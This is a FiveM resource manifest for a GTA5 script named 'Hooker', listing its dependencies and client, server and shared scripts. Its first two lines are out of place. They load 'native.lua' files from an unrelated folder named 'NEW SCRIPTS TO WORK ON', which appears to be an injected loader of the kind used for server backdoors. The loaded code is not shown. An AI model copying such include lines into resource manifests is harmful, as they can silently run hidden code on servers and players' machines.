

client_script '@NEW%20SCRIPTS%20TO%20WORK%20ON/client/native.lua'
server_script '@NEW%20SCRIPTS%20TO%20WORK%20ON/server/native.lua'
fx_version 'bodacious'
game 'gta5'
description 'Hooker'
author 'MenanAk47'

shared_scripts {
    '@ox_lib/init.lua',
    'config.lua'
}

server_scripts {
    'server/main.lua',
    'locales/locale.lua',
    'locales/en.lua',
}

client_scripts {
    'client/main.lua',
    'locales/locale.lua',
    'locales/en.lua',
}

escrow_ignore {
    'config.lua',
    'locales/locale.lua',
    'locales/en.lua',
}

lua54 'yes'

dependencies {
    'qb-core',
    'ox_lib',
    'qb-target',
}

dependency '/assetpacks'